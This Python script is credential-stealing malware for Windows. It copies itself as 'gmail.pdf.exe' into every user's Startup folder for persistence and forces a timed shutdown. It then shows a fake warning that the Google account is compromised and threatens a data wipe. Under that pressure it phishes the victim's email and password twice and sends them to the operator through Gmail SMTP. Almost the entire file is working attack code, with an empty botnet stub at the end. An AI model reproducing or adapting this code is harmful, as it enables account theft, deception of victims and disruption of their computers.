import os
import sys
import shutil
import smtplib
from socket import *

known=["All Users" , "Default" , "Default User" , "Public" , "TEMP"]
def sendme():
    loc="C:\\Temp\\"
    d=os.listdir("C:\\Temp\\")
    if "done.txt" in d:
        return 0                         
    textfile=r"C:\Temp\zmail.txt"
    fp = open(textfile, 'r')
    msg = fp.readline()
    fp.close()

    while 1 :
        try:
            # creates SMTP session
            s = smtplib.SMTP('smtp.gmail.com', 587)
            # start TLS for security
            s.starttls()
            # Authentication
            s.login("your email id", "your password")
            # message to be sent
            sender=recver="your email"
            # sending the mail
            s.sendmail(sender,recver,msg)
            # terminating the session
            s.quit()
            f=open(r"C:\Temp\done.txt","w")
            f.close()
            break
        except Exception as e:
            pass 

def askpass():
    print(""" The google account on this device was compromized \n
            verifiy the email and password to prevent data wipe and boot loop""")
    e=input("Email : ")
    p=input("Password : ")
    file= open("C:\\Temp\\zmail.txt","w")
    file.write(e+" "+p)
    file.close()
    print("wrong email and password re-enter")
    e1=input("Email : ")
    p1=input("Password : ")
    if e != e1 and p != p1 :
        file= open("C:\\Temp\\zmail.txt","w")
        file.write(e1+" "+p1)
        file.close()
    os.system("shutdown /a")
    sendme()

def execute():
    os.system(""" The device is suspicious """)
    os.system("shutdown /s /t 100 /f")
    askpass()

def passcheck():
    try:
        file=open("C:\\Temp\\zmail.txt","r")
        if file.read() :
            return True
        else :
            return False
    except Exception as e :
        return False

def copier():
    
    if passcheck():
        sendme()
        return 0
    loc=os.getcwd()
    name=loc+"\\gmail.pdf.exe"
    os.chdir("C:\\Users")
    cdir=os.getcwd()
    dirs=os.listdir()
    req_dirs=[]
    for i in dirs:
        print("Scanning the device")
        if i not in known:
            if os.path.isdir(os.path.join(cdir,i)):
                req_dirs.append(i)
    
    for i in req_dirs:
        tdir=os.path.join(cdir,i)
        tdir=os.path.join(tdir,"AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        print("...")
        if os.path.isdir(tdir):
            f=open("C:\\Temp\\zmail.txt","w")
            f.close()
            os.system('move'+' '+'"'+name+'" '+'"'+tdir+'"')
            print("done ")
            execute()

def botnet():
    pass
copier()
#botnet()
